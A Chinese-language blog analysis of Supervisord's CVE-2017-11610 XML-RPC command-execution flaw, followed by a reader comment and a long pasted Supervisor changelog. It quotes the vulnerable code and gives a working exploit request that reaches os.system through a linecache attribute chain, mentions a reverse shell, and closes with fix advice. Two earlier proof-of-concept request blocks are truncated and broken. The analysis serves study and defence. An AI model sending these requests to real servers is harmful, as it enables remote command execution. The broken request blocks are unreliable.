查看Supervisord的配置文件可知，默认情况下，Server端监听在unix套接字`unix:///tmp/supervisor.sock`上，而Client配置的serverurl也是这个地址：

```
[unix_http_server]
file=/tmp/supervisor.sock   ; the path to the socket file
;chmod=0700                 ; socket file mode (default 0700)
;chown=nobody:nogroup       ; socket file uid:gid owner
;username=user              ; default is no username (open server)
;password=123               ; default is no password (open server)

;[inet_http_server]         ; inet (TCP) server disabled by default
;port=127.0.0.1:9001        ; ip_address:port specifier, *:port for all iface
;username=user              ; default is no username (open server)
;password=123               ; default is no password (open server)

[supervisorctl]
serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket
;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket
;username=chris              ; should be same as in [*_http_server] if set
;password=123                ; should be same as in [*_http_server] if set
;prompt=mysupervisor         ; cmd line prompt (default "supervisor")
;history_file=~/.sc_history  ; use readline history if available

```

所以，Client端去连接配置文件中的serverurl的地址，并与其使用RPC协议（基于HTTP协议）通信。比如我们平时常用的命令（启动名为web的服务）：`supervisorctl start web`，看下其数据包：

[![15017662633950.jpg](/media/attachment/2017/08/03/97966e79-761e-485c-b893-5c12fdda3c4d.23b193a5880b.jpg)](/media/attachment/2017/08/03/97966e79-761e-485c-b893-5c12fdda3c4d.jpg)

其实很简单的协议，通过XML，将methodName和params通过HTTP协议传给服务端进行执行。`start`命令执行的是`supervisor.startProcess`方法，仅有一个参数就是服务的名称。

另外，如果我设置了`[inet_http_server]`段，即可将Supervisord监听在TCP端口上，这样外部其他程序也能进行调用。我们可以直接将默认配置文件中这一段前面的分号去掉，就默认监听在9001端口上了。

## [漏洞分析](#_1)

CVE-2017-11610的本质是一个不安全的对象引用+方法调用，十分类似Java中的反序列化漏洞。

在上一章中我说了，Supervisord的控制实际上就是一个C/S以RPC协议的通信的过程，而RPC协议（远程过程调用协议），顾名思义就是C端通过RPC协议可以在S端执行某个函数，并得到返回结果。那么，如果C端执行了S端预料之外的函数（如`os.system`），那么就会导致漏洞的产生。

一个安全的RPC协议，会有一个函数名的映射，也就是说C端只能调用在白名单之中的部分函数，并且这个“函数”只是真正函数的一个映射。

而我们来看看3.3.2版本中Supervisord是如何处理RPC调用的：

```
class supervisor_xmlrpc_handler(xmlrpc_handler):
    ...

    def call(self, method, params):
        return traverse(self.rpcinterface, method, params)

def traverse(ob, method, params):
    path = method.split('.')
    for name in path:
        if name.startswith('_'):
            # security (don't allow things that start with an underscore to
            # be called remotely)
            raise RPCError(Faults.UNKNOWN_METHOD)
        ob = getattr(ob, name, None)
        if ob is None:
            raise RPCError(Faults.UNKNOWN_METHOD)

    try:
        return ob(*params)
    except TypeError:
        raise RPCError(Faults.INCORRECT_PARAMETERS)

```

`supervisor_xmlrpc_handlerl`类用于处理RPC请求，其call方法就是真正执行远程调用的函数。在call方法中调用了traverse函数，跟进这个函数，我们发现他的逻辑是这样：

1. 将method用点号分割成数组path
2. 遍历这个数组，每次获得一个name
3. 如果name不以下划线开头，则获取ob对象的name属性，其作为新的ob对象
4. 遍历完成后获得最终的ob对象，调用之

所以，实际上这个函数最后达成的效果就是：**初始ob对象下的任意public方法，包括它的所有递归子对象的任意public方法，都可以被调用。**

而此处，ob对象即为`self.rpcinterface`，官方开发者可能认为可调用的方法只限制在这个对象内部，所以没有做特别严格的白名单限制。

而CVE-2017-11610的发现者发现，在`self.rpcinterface.supervisor.supervisord.options`对象下，有一个方法`execve`，其相当于直接调用了系统的`os.execve`函数，是可以直接执行任意命令的：

```
class ServerOptions(Options):
    ...
    def execve(self, filename, argv, env):
        return os.execve(filename, argv, env)

```

所以，最后给出利用POC（RPC协议如何构造数据包、XML是什么格式，这个可以自己去看看文档）：

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

</data>
</array>
</param>
<param>
<struct>
</struct>
</param>
</params>
</methodCall>

```
## [POC缺陷与改进](#poc)

当然，漏洞发现者找到的这个`self.rpcinterface.supervisor.supervisord.options.execve`其实不是那么好用，原因是，Python的`os.execve`函数会使用新进程取代现有的进程。也就是说，这里会导致Supervisord本身退出。

基于Docker容器的Supervisord（如Vulhub里这个靶场），如果基础进程Supervisord被退出，那么将导致整个容器被退出，即使我们执行了任意命令，我们获得的权限也是转瞬即逝的。

另外，即使非Docker环境，我们在测试漏洞的过程中影响到了线上业务，这个后果是无法估量的，所以我们必须想其他方法来稳定的利用漏洞。

我说两个方法。

### [法一、先Fork一个新进程](#fork)

同样在`self.rpcinterface.supervisor.supervisord.options`对象中，有一个`fork`方法，是调用了系统的`os.fork`函数。

`os.fork`函数的作用就是根据当前进程，派生一个新的子进程。所以，即使当前进程被意外结束了，也不会导致Supervisord服务终止，因为派生的进程还留存着。

所以，先发送如下数据包即可派生新进程：

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en

```

然后再发送之前的POC即可。

但这个方法还是会影响Docker容器。

### [法二、找寻其他利用链](#_2)

这个漏洞和一些反序列化漏洞类似，都是去找到一个不安全的对象。那么，除了原作者给出的`self.rpcinterface.supervisor.supervisord.options.execve()`，是不是还可以找到其他更好用的利用链呢？

通过一系列调试，我找到了一个利用链：`supervisor.supervisord.options.warnings.linecache.os.system()`，其实目的很简单，就是想方设法找到非下划线开头的属性中，是否有引用os模块。linecache中引用了os模块：

[![15017691812399.jpg](/media/attachment/2017/08/03/f45bbd15-0121-418a-aadd-1056b9302263.4a2acedef5b3.jpg)](/media/attachment/2017/08/03/f45bbd15-0121-418a-aadd-1056b9302263.jpg)

所以，构造如下数据包：

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 275

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/success</string>
</param>
</params>
</methodCall>

```

即可直接执行任意命令。如，反弹shell：

[![15017694617107.jpg](/media/attachment/2017/08/03/f73270ff-b734-4b32-ac0c-c393ad5099f9.399bbe8769f9.jpg)](/media/attachment/2017/08/03/f73270ff-b734-4b32-ac0c-c393ad5099f9.jpg)

## [漏洞影响与修复](#_3)

出现这个漏洞，一般有几个条件：

1. Supervisord版本在受影响的范围内
2. RPC端口可被访问
3. RPC无密码或密码脆弱

第二个条件其实不太容易达到。默认安装的Supervisord，是只监听unix套接字的，所以外部IP根本无法访问。

另外，如果你已经拿到了一台机器的低权限，想访问本地的unix套接字，利用该漏洞提权，也是不现实的：原因是supervisord.sock文件权限默认是0700，其他用户无法访问，能够访问的用户权限和它是一样的，也就不存在提权的说法了。

当然，如果运维同学不小心将RPC端口开放了，并且使用了默认密码或没有设置密码，那么借助这个漏洞进行攻击，也是很不错的。

如何修复这个漏洞？

1. 升级Supervisord
2. 端口访问控制
3. 设置复杂RPC密码

将path用点号分割成数组

这句话是不是应该改成：

将method用点号分割成数组path

- Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.3.2 (2017-06-03)------------------
- Fixed a bug introduced in 3.3.0 where the ``supervisorctl reload`` command would crash ``supervisord`` with the error ``OSError: [Errno 9] Bad file descriptor`` if the ``kqueue`` poller was used. Patch by Jared Suttles.
- Fixed a bug introduced in 3.3.0 where ``supervisord`` could get stuck in a polling loop after the web interface was used, causing high CPU usage. Patch by Jared Suttles.
- Fixed a bug where if ``supervisord`` attempted to start but aborted due to another running instance of ``supervisord`` with the same config, the pidfile of the running instance would be deleted. Patch by coldnight.
- Fixed a bug where ``supervisorctl fg`` would swallow most XML-RPC faults. ``fg`` now prints the fault and exits.
- Parsing the config file will now fail with an error message if a process or group name contains a forward slash character (``/``) since it would break the URLs used by the web interface.
- ``supervisorctl reload`` now shows an error message if an argument is given. Patch by Joel Krauska.
- ``supervisorctl`` commands ``avail``, ``reread``, and ``version`` now show an error message if an argument is given.
3.3.1 (2016-08-02)------------------
- Fixed an issue where ``supervisord`` could hang when responding to HTTP requests (including ``supervisorctl`` commands) if the system time was set back after ``supervisord`` was started.
- Zope ``trackrefs``, a debugging tool that was included in the ``tests`` directory but hadn't been used for years, has been removed.
3.3.0 (2016-05-14)------------------
- ``supervisord`` will now use ``kqueue``, ``poll``, or ``select`` to monitor its file descriptors, in that order, depending on what is available on the system. Previous versions used ``select`` only and would crash with the error ``ValueError: filedescriptor out of range in select()`` when running a large number of subprocesses (whatever number resulted in enough file descriptors to exceed the fixed-size file descriptor table used by ``select``, which is typically 1024). Patch by Igor Sobreira.
- ``/etc/supervisor/supervisord.conf`` has been added to the config file search paths. Many versions of Supervisor packaged for Debian and Ubuntu have included a patch that added this path. This difference was reported in a number of tickets as a source of confusion and upgrade difficulties, so the path has been added. Patch by Kelvin Wong.
- Glob patterns in the ``[include]`` section now support the ``host\_node\_name`` expansion. Patch by Paul Lockaby.
- Files included via the ``[include]`` section are now logged at the ``INFO`` level instead of ``WARN``. Patch by Daniel Hahler.
3.2.4 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.2.3 (2016-03-19)------------------
- 400 Bad Request is now returned if an XML-RPC request is received with invalid body data. In previous versions, 500 Internal Server Error was returned.
3.2.2 (2016-03-04)------------------
- Parsing the config file will now fail with an error message if an ``inet\_http\_server`` or ``unix\_http\_server`` section contains a ``username=`` but no ``password=``. In previous versions, ``supervisord`` would start with this invalid configuration but the HTTP server would always return a 500 Internal Server Error. Thanks to Chris Ergatides for reporting this issue.
3.2.1 (2016-02-06)------------------
- Fixed a server exception ``OverflowError: int exceeds XML-RPC limits`` that made ``supervisorctl status`` unusable if the system time was far into the future. The XML-RPC API returns timestamps as XML-RPC integers, but timestamps will exceed the maximum value of an XML-RPC integer in January 2038 ("Year 2038 Problem"). For now, timestamps exceeding the maximum integer will be capped at the maximum to avoid the exception and retain compatibility with existing API clients. In a future version of the API, the return type for timestamps will be changed.
3.2.0 (2015-11-30)------------------
- Files included via the ``[include]`` section are read in sorted order. In past versions, the order was undefined. Patch by Ionel Cristian Mărieș.
- ``supervisorctl start`` and ``supervisorctl stop`` now complete more quickly when handling many processes. Thanks to Chris McDonough for this patch. See: https://github.com/Supervisor/supervisor/issues/131
- Environment variables are now expanded for all config file options. Patch by Dexter Tad-y.
- Added ``signalProcess``, ``signalProcessGroup``, and ``signalAllProcesses`` XML-RPC methods to supervisor RPC interface. Thanks to Casey Callendrello, Marc Abramowitz, and Moriyoshi Koizumi for the patches.
- Added ``signal`` command to supervisorctl. Thanks to Moriyoshi Koizumi and Marc Abramowitz for the patches.
- Errors caused by bad values in a config file now show the config section to make debugging easier. Patch by Marc Abramowitz.
- Setting ``redirect\_stderr=true`` in an ``[eventlistener:x]`` section is now disallowed because any messages written to ``stderr`` would interfere with the eventlistener protocol on ``stdout``.
- Fixed a bug where spawning a process could cause ``supervisord`` to crash if an ``IOError`` occurred while setting up logging. One way this could happen is if a log filename was accidentally set to a directory instead of a file. Thanks to Grzegorz Nosek for reporting this issue.
- Fixed a bug introduced in 3.1.0 where ``supervisord`` could crash when attempting to display a resource limit error.
- Fixed a bug where ``supervisord`` could crash with the message ``Assertion failed for processname: RUNNING not in STARTING`` if a time change caused the last start time of the process to be in the future. Thanks to Róbert Nagy, Sergey Leschenko, and samhair for the patches.
- A warning is now logged if an eventlistener enters the UNKNOWN state, which usually indicates a bug in the eventlistener. Thanks to Steve Winton and detailyang for reporting issues that led to this change.
- Errors from the web interface are now logged at the ``ERROR`` level. Previously, they were logged at the ``TRACE`` level and easily missed. Thanks to Thomas Güttler for reporting this issue.
- Fixed ``DeprecationWarning: Parameters to load are deprecated. Call .resolve and .require separately.`` on setuptools >= 11.3.
- If ``redirect\_stderr=true`` and ``stderr\_logfile=auto``, no stderr log file will be created. In previous versions, an empty stderr log file would be created. Thanks to Łukasz Kożuchowski for the initial patch.
- Fixed an issue in Medusa that would cause ``supervisorctl tail -f`` to disconnect if many other ``supervisorctl`` commands were run in parallel. Patch by Stefan Friesel.
3.1.4 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.1.3 (2014-10-28)------------------
- Fixed an XML-RPC bug where the ElementTree-based parser handled strings like ``<value><string>hello</string></value>`` but not strings like ``<value>hello</value>``, which are valid in the XML-RPC spec. This fixes compatibility with the Apache XML-RPC client for Java and possibly other clients.
3.1.2 (2014-09-07)------------------
- Fixed a bug where ``tail group:\*`` in ``supervisorctl`` would show a 500 Internal Server Error rather than a BAD\_NAME fault.
- Fixed a bug where the web interface would show a 500 Internal Server Error instead of an error message for some process start faults.
- Removed medusa files not used by Supervisor.
3.1.1 (2014-08-11)------------------
- Fixed a bug where ``supervisorctl tail -f name`` output would stop if log rotation occurred while tailing.
- Prevent a crash when a greater number of file descriptors were attempted to be opened than permitted by the environment when starting a bunch of programs. Now, instead a spawn error is logged.
- Compute "channel delay" properly, fixing symptoms where a supervisorctl start command would hang for a very long time when a process (or many processes) are spewing to their stdout or stderr. See comments attached to https://github.com/Supervisor/supervisor/pull/263 .
- Added ``docs/conf.py``, ``docs/Makefile``, and ``supervisor/scripts/\*.py`` to the release package.
3.1.0 (2014-07-29)------------------
- The output of the ``start``, ``stop``, ``restart``, and ``clear`` commands in ``supervisorctl`` has been changed to be consistent with the ``status`` command. Previously, the ``status`` command would show a process like ``foo:foo\_01`` but starting that process would show ``foo\_01: started`` (note the group prefix ``foo:`` was missing). Now, starting the process will show ``foo:foo\_01: started``. Suggested by Chris Wood.
- The ``status`` command in ``supervisorctl`` now supports group name syntax: ``status group:\*``.
- The process column in the table output by the ``status`` command in ``supervisorctl`` now expands to fit the widest name.
- The ``update`` command in ``supervisorctl`` now accepts optional group names. When group names are specified, only those groups will be updated. Patch by Gary M. Josack.
- Tab completion in ``supervisorctl`` has been improved and now works for more cases. Thanks to Mathieu Longtin and Marc Abramowitz for the patches.
- Attempting to start or stop a process group in ``supervisorctl`` with the ``group:\*`` syntax will now show the same error message as the ``process`` syntax if the name does not exist. Previously, it would show a Python exception. Patch by George Ang.
- Added new ``PROCESS\_GROUP\_ADDED`` and ``PROCESS\_GROUP\_REMOVED`` events. These events are fired when process groups are added or removed from Supervisor's runtime configuration when using the ``add`` and ``remove`` commands in ``supervisorctl``. Patch by Brent Tubbs.
- Stopping a process in the backoff state now changes it to the stopped state. Previously, an attempt to stop a process in backoff would be ignored. Patch by Pascal Varet.
- The ``directory`` option is now expanded separately for each process in a homogeneous process group. This allows each process to have its own working directory. Patch by Perttu Ranta-aho.
- Removed ``setuptools`` from the ``requires`` list in ``setup.py`` because it caused installation issues on some systems.
- Fixed a bug in Medusa where the HTTP Basic authorizer would cause an exception if the password contained a colon. Thanks to Thomas Güttler for reporting this issue.
- Fixed an XML-RPC bug where calling supervisor.clearProcessLogs() with a name like ``group:\*`` would cause a 500 Internal Server Error rather than returning a BAD\_NAME fault.
- Fixed a hang that could occur in ``supervisord`` if log rotation is used and an outside program deletes an active log file. Patch by Magnus Lycka.
- A warning is now logged if a glob pattern in an ``[include]`` section does not match any files. Patch by Daniel Hahler.
3.0.1 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.0 (2013-07-30)----------------
- Parsing the config file will now fail with an error message if a process or group name contains characters that are not compatible with the eventlistener protocol.
- Fixed a bug where the ``tail -f`` command in ``supervisorctl`` would fail if the combined length of the username and password was over 56 characters.
- Reading the config file now gives a separate error message when the config file exists but can't be read. Previously, any error reading the file would be reported as "could not find config file". Patch by Jens Rantil.
- Fixed an XML-RPC bug where array elements after the first would be ignored when using the ElementTree-based XML parser. Patch by Zev Benjamin.
- Fixed the usage message output by ``supervisorctl`` to show the correct default config file path. Patch by Alek Storm.
3.0b2 (2013-05-28)------------------
- The behavior of the program option ``user`` has changed. In all previous versions, if ``supervisord`` failed to switch to the user, a warning would be sent to the stderr log but the child process would still be spawned. This means that a mistake in the config file could result in a child process being unintentionally spawned as root. Now, ``supervisord`` will not spawn the child unless it was able to successfully switch to the user. Thanks to Igor Partola for reporting this issue.
- If a user specified in the config file does not exist on the system, ``supervisord`` will now print an error and refuse to start.
- Reverted a change to logging introduced in 3.0b1 that was intended to allow multiple processes to log to the same file with the rotating log handler. The implementation caused supervisord to crash during reload and to leak file handles. Also, since log rotation options are given on a per-program basis, impossible configurations could be created (conflicting rotation options for the same file). Given this and that supervisord now has syslog support, it was decided to remove this feature. A warning was added to the documentation that two processes may not log to the same file.
- Fixed a bug where parsing ``command=`` could cause supervisord to crash if shlex.split() fails, such as a bad quoting. Patch by Scott Wilson.
- It is now possible to use ``supervisorctl`` on a machine with no ``supervisord.conf`` file by supplying the connection information in command line options. Patch by Jens Rantil.
- Fixed a bug where supervisord would crash if the syslog handler was used and supervisord received SIGUSR2 (log reopen request).
- Fixed an XML-RPC bug where calling supervisor.getProcessInfo() with a bad name would cause a 500 Internal Server Error rather than the returning a BAD\_NAME fault.
- Added a favicon to the web interface. Patch by Caio Ariede.
- Fixed a test failure due to incorrect handling of daylight savings time in the childutils tests. Patch by Ildar Hizbulin.
- Fixed a number of pyflakes warnings for unused variables, imports, and dead code. Patch by Philippe Ombredanne.
3.0b1 (2012-09-10)------------------
- Fixed a bug where parsing ``environment=`` did not verify that key/value pairs were correctly separated. Patch by Martijn Pieters.
- Fixed a bug in the HTTP server code that could cause unnecessary delays when sending large responses. Patch by Philip Zeyliger.
- When supervisord starts up as root, if the ``-c`` flag was not provided, a warning is now emitted to the console. Rationale: supervisord looks in the current working directory for a ``supervisord.conf`` file; someone might trick the root user into starting supervisord while cd'ed into a directory that has a rogue ``supervisord.conf``.
- A warning was added to the documentation about the security implications of starting supervisord without the ``-c`` flag.
- Add a boolean program option ``stopasgroup``, defaulting to false. When true, the flag causes supervisor to send the stop signal to the whole process group. This is useful for programs, such as Flask in debug mode, that do not propagate stop signals to their children, leaving them orphaned.
- Python 2.3 is no longer supported. The last version that supported Python 2.3 is Supervisor 3.0a12.
- Removed the unused "supervisor\_rpc" entry point from setup.py.
- Fixed a bug in the rotating log handler that would cause unexpected results when two processes were set to log to the same file. Patch by Whit Morriss.
- Fixed a bug in config file reloading where each reload could leak memory because a list of warning messages would be appended but never cleared. Patch by Philip Zeyliger.
- Added a new Syslog log handler. Thanks to Denis Bilenko, Nathan L. Smith, and Jason R. Coombs, who each contributed to the patch.
- Put all change history into a single file (CHANGES.txt).
3.0a12 (2011-12-06)-------------------
- Released to replace a broken 3.0a11 package where non-Python files were not included in the package.
3.0a11 (2011-12-06)-------------------
- Added a new file, ``PLUGINS.rst``, with a listing of third-party plugins for Supervisor. Contributed by Jens Rantil.
- The ``pid`` command in supervisorctl can now be used to retrieve the PIDs of child processes. See ``help pid``. Patch by Gregory Wisniewski.
- Added a new ``host\_node\_name`` expansion that will be expanded to the value returned by Python's ``platform.node`` (see http://docs.python.org/library/platform.html#platform.node). Patch by Joseph Kondel.
- Fixed a bug in the web interface where pages over 64K would be truncated. Thanks to Drew Perttula and Timothy Jones for reporting this.
- Renamed ``README.txt`` to ``README.rst`` so GitHub renders the file as ReStructuredText.
- The XML-RPC server is now compatible with clients that do not send empty <params> when there are no parameters for the method call. Thanks to Johannes Becker for reporting this.
- Fixed ``supervisorctl --help`` output to show the correct program name.
- The behavior of the configuration options ``minfds`` and ``minprocs`` has changed. Previously, if a hard limit was less than ``minfds`` or ``minprocs``, supervisord would unconditionally abort with an error. Now, supervisord will attempt to raise the hard limit. This may succeed if supervisord is run as root, otherwise the error is printed as before. Patch by Benoit Sigoure.
- Add a boolean program option ``killasgroup``, defaulting to false, if true when resorting to send SIGKILL to stop/terminate the process send it to its whole process group instead to take care of possible children as well and not leave them behind. Patch by Samuele Pedroni.
- Environment variables may now be used in the configuration file for options that support string expansion. Patch by Aleksey Sivokon.
- Fixed a race condition where supervisord might not act on a signal sent to it. Thanks to Adar Dembo for reporting the issue and supplying the initial patch.
- Updated the output of ``echo\_supervisord\_conf`` to fix typos and improve comments. Thanks to Jens Rantil for noticing these.
- Fixed a possible 500 Server Error from the web interface. This was observed when using Supervisor on a domain socket behind Nginx, where Supervisor would raise an exception because REMOTE\_ADDR was not set. Patch by David Bennett.
3.0a10 (2011-03-30)-------------------
- Fixed the stylesheet of the web interface so the footer line won't overlap a long process list. Thanks to Derek DeVries for the patch.
- Allow rpc interface plugins to register new events types.
- Bug fix for FCGI sockets not getting cleaned up when the ``reload`` command is issued from supervisorctl. Also, the default behavior has changed for FCGI sockets. They are now closed whenever the number of running processes in a group hits zero. Previously, the sockets were kept open unless a group-level stop command was issued.
- Better error message when HTTP server cannot reverse-resolve a hostname to an IP address. Previous behavior: show a socket error. Current behavior: spit out a suggestion to stdout.
- Environment variables set via ``environment=`` value within ``[supervisord]`` section had no effect. Thanks to Wyatt Baldwin for a patch.
- Fix bug where stopping process would cause process output that happened after the stop request was issued to be lost. See https://github.com/Supervisor/supervisor/issues/11.
- Moved 2.X change log entries into ``HISTORY.txt``.
- Converted ``CHANGES.txt`` and ``README.txt`` into proper ReStructuredText and included them in the ``long\_description`` in ``setup.py``.
- Added a tox.ini to the package (run via ``tox`` in the package dir). Tests supervisor on multiple Python versions.
3.0a9 (2010-08-13)------------------
- Use rich comparison methods rather than \_\_cmp\_\_ to sort process configs and process group configs to better straddle Python versions. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed test\_supervisorctl.test\_maintail\_dashf test for Python 2.7. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed the way that supervisor.datatypes.url computes a "good" URL for compatibility with Python 2.7 and Python >= 2.6.5. URLs with bogus "schemes://" will now be accepted as a version-straddling compromise (before they were rejected before supervisor would start). (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Add a ``-v`` / ``--version`` option to supervisord: Print the supervisord version number out to stdout and exit. (Roger Hoover)
- Import iterparse from xml.etree when available (eg: Python 2.6). Patch by Sidnei da Silva.
- Fixed the url to the supervisor-users mailing list. Patch by Sidnei da Silva
- When parsing "environment=" in the config file, changes introduced in 3.0a8 prevented Supervisor from parsing some characters commonly found in paths unless quoting was used as in this example::
 environment=HOME='/home/auser'
 Supervisor once again allows the above line to be written as::
 environment=HOME=/home/auser
 Alphanumeric characters, "\_", "/", ".", "+", "-", "(", ")", and ":" can all be used as a value without quoting. If any other characters are needed in the value, please quote it as in the first example above. Thanks to Paul Heideman for reporting this issue.
- Supervisor will now look for its config file in locations relative to the executable path, allowing it to be used more easily in virtual environments. If sys.argv[0] is ``/path/to/venv/bin/supervisorctl``, supervisor will now look for it's config file in ``/path/to/venv/etc/supervisord.conf`` and ``/path/to/venv/supervisord.conf`` in addition to the other standard locations. Patch by Chris Rossi.
3.0a8 (2010-01-20)------------------
- Don't cleanup file descriptors on first supervisord invocation: this is a lame workaround for Snow Leopard systems that use libdispatch and are receiving "Illegal instruction" messages at supervisord startup time. Restarting supervisord via "supervisorctl restart" may still cause a crash on these systems.
- Got rid of Medusa hashbang headers in various files to ease RPM packaging.
- Allow umask to be 000 (patch contributed by Rowan Nairn).
- Fixed a bug introduced in 3.0a7 where supervisorctl wouldn't ask for a username/password combination properly from a password-protected supervisord if it wasn't filled in within the "[supervisorctl]" section username/password values. It now properly asks for a username and password.
- Fixed a bug introduced in 3.0a7 where setup.py would not detect the Python version correctly. Patch by Daniele Paolella.
- Fixed a bug introduced in 3.0a7 where parsing a string of key/value pairs failed on Python 2.3 due to use of regular expression syntax introduced in Python 2.4.
- Removed the test suite for the ``memmon`` console script, which was moved to the Superlance package in 3.0a7.
- Added release dates to CHANGES.txt.
- Reloading the config for an fcgi process group did not close the fcgi socket - now, the socket is closed whenever the group is stopped as a unit (including during config update). However, if you stop all the processes in a group individually, the socket will remain open to allow for graceful restarts of FCGI daemons. (Roger Hoover)
- Rereading the config did not pick up changes to the socket parameter in a fcgi-program section. (Roger Hoover)
- Made a more friendly exception message when a FCGI socket cannot be created. (Roger Hoover)
- Fixed a bug where the --serverurl option of supervisorctl would not accept a URL with a "unix" scheme. (Jason Kirtland)
- Running the tests now requires the "mock" package. This dependency has been added to "tests\_require" in setup.py. (Roger Hoover)
- Added support for setting the ownership and permissions for an FCGI socket. This is done using new "socket\_owner" and "socket\_mode" options in an [fcgi-program:x] section. See the manual for details. (Roger Hoover)
- Fixed a bug where the FCGI socket reference count was not getting decremented on spawn error. (Roger Hoover)
- Fixed a Python 2.6 deprecation warning on use of the "sha" module.
- Updated ez\_setup.py to one that knows about setuptools 0.6c11.
- Running "supervisorctl shutdown" no longer dumps a Python backtrace when it can't connect to supervisord on the expected socket. Thanks to Benjamin Smith for reporting this.
- Removed use of collections.deque in our bundled version of asynchat because it broke compatibility with Python 2.3.
- The sample configuration output by "echo\_supervisord\_conf" now correctly shows the default for "autorestart" as "unexpected". Thanks to William Dode for noticing it showed the wrong value.
3.0a7 (2009-05-24)------------------
- We now bundle our own patched version of Medusa contributed by Jason Kirtland to allow Supervisor to run on Python 2.6. This was done because Python 2.6 introduced backwards incompatible changes to asyncore and asynchat in the stdlib.
- The console script ``memmon``, introduced in Supervisor 3.0a4, has been moved to Superlance (http://pypi.python.org/pypi/superlance). The Superlance package contains other useful monitoring tools designed to run under Supervisor.
- Supervisorctl now correctly interprets all of the error codes that can be returned when starting a process. Patch by Francesc Alted.
- New ``stdout\_events\_enabled`` and ``stderr\_events\_enabled`` config options have been added to the ``[program:x]``, ``[fcgi-program:x]``, and ``[eventlistener:x]`` sections. These enable the emitting of new PROCESS\_LOG events for a program. If unspecified, the default is False.
 If enabled for a subprocess, and data is received from the stdout or stderr of the subprocess while not in the special capture mode used by PROCESS\_COMMUNICATION, an event will be emitted.
 Event listeners can subscribe to either PROCESS\_LOG\_STDOUT or PROCESS\_LOG\_STDERR individually, or PROCESS\_LOG for both.
- Values for subprocess environment variables specified with environment= in supervisord.conf can now be optionally quoted, allowing them to contain commas. Patch by Tim Godfrey.
- Added a new event type, REMOTE\_COMMUNICATION, that is emitted by a new RPC method, supervisor.sendRemoteCommEvent().
- Patch for bug #268 (KeyError on ``here`` expansion for stdout/stderr\_logfile) from David E. Kindred.
- Add ``reread``, ``update``, and ``avail`` commands based on Anders Quist's ``online\_config\_reload.diff`` patch. This patch extends the "add" and "drop" commands with automagical behavior::
 In supervisorctl:
 supervisor> status bar RUNNING pid 14864, uptime 18:03:42 baz RUNNING pid 23260, uptime 0:10:16 foo RUNNING pid 14866, uptime 18:03:42 gazonk RUNNING pid 23261, uptime 0:10:16 supervisor> avail bar in use auto 999:999 baz in use auto 999:999 foo in use auto 999:999 gazonk in use auto 999:999 quux avail auto 999:999
 Now we add this to our conf:
 [group:zegroup] programs=baz,gazonk
 Then we reread conf:
 supervisor> reread baz: disappeared gazonk: disappeared quux: available zegroup: available supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux avail auto 999:999 zegroup:baz avail auto 999:999 zegroup:gazonk avail auto 999:999 supervisor> status bar RUNNING pid 14864, uptime 18:04:18 baz RUNNING pid 23260, uptime 0:10:52 foo RUNNING pid 14866, uptime 18:04:18 gazonk RUNNING pid 23261, uptime 0:10:52
 The magic make-it-so command:
 supervisor> update baz: stopped baz: removed process group gazonk: stopped gazonk: removed process group zegroup: added process group quux: added process group supervisor> status bar RUNNING pid 14864, uptime 18:04:43 foo RUNNING pid 14866, uptime 18:04:43 quux RUNNING pid 23561, uptime 0:00:02 zegroup:baz RUNNING pid 23559, uptime 0:00:02 zegroup:gazonk RUNNING pid 23560, uptime 0:00:02 supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux in use auto 999:999 zegroup:baz in use auto 999:999 zegroup:gazonk in use auto 999:999
- Fix bug with symptom "KeyError: 'process\_name'" when using a logfile name including documented``process\_name`` Python string expansions.
- Tab completions in the supervisorctl shell, and a foreground mode for Supervisor, implemented as a part of GSoC. The supervisorctl program now has a ``fg`` command, which makes it possible to supply inputs to a process, and see its output/error stream in real time.
- Process config reloading implemented by Anders Quist. The supervisorctl program now has the commands "add" and "drop". "add <programname>" adds the process group implied by <programname> in the config file. "drop <programname>" removes the process group from the running configuration (it must already be stopped). This makes it possible to add processes to and remove processes from a running supervisord without restarting the supervisord process.
- Fixed a bug where opening the HTTP servers would fail silently for socket errors other than errno.EADDRINUSE.
- Thanks to Dave Peticolas, using "reload" against a supervisord that is running in the background no longer causes supervisord to crash.
- Configuration options for logfiles now accept mixed case reserved words (e.g. "AUTO" or "auto") for consistency with other options.
- childutils.eventdata was buggy, it could not deal with carriage returns in data. See http://www.plope.com/software/collector/257. Thanks to Ian Bicking.
